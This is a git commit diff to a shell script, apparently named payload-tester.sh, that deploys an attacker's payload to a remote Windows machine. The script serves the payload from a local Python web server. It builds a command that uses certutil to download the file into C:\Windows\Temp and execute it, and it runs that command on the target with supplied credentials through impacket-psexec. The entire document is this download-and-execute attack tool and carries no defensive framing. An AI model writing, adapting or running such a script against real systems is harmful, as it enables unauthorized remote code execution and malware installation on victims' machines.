f5dbb8250b8bf4ca56b385b561b29438a421b463
Your Name <you@example.com>
2023-05-11 02:58:37 +0530

    chalgya

--- payload-tester.sh
+++ payload-tester.sh
@@ -11,9 +11,9 @@ username="$1"
 password="$2"
 ip_address="$3"
 payload="$4"
-
-# Run the command using Impacket's psexec.py
-/usr/bin/python3 -m http.server 80 &
-echo "Started web server on ip $(curl -s ifconfig.me)"
+serverip=$(curl -s ifconfig.me)
+gnome-terminal -- /usr/bin/python3 -m http.server 80
+echo "Started web server on ip $serverip"
+command="cmd /c \"cd C:\Windows\Temp & certutil.exe -urlcache -split -f http://$serverip/$payload $payload & .\\$payload\""
 echo "impacket-psexec $username":"$password"@"$ip_address" "$command"
 impacket-psexec "$username":"$password"@"$ip_address" "$command"
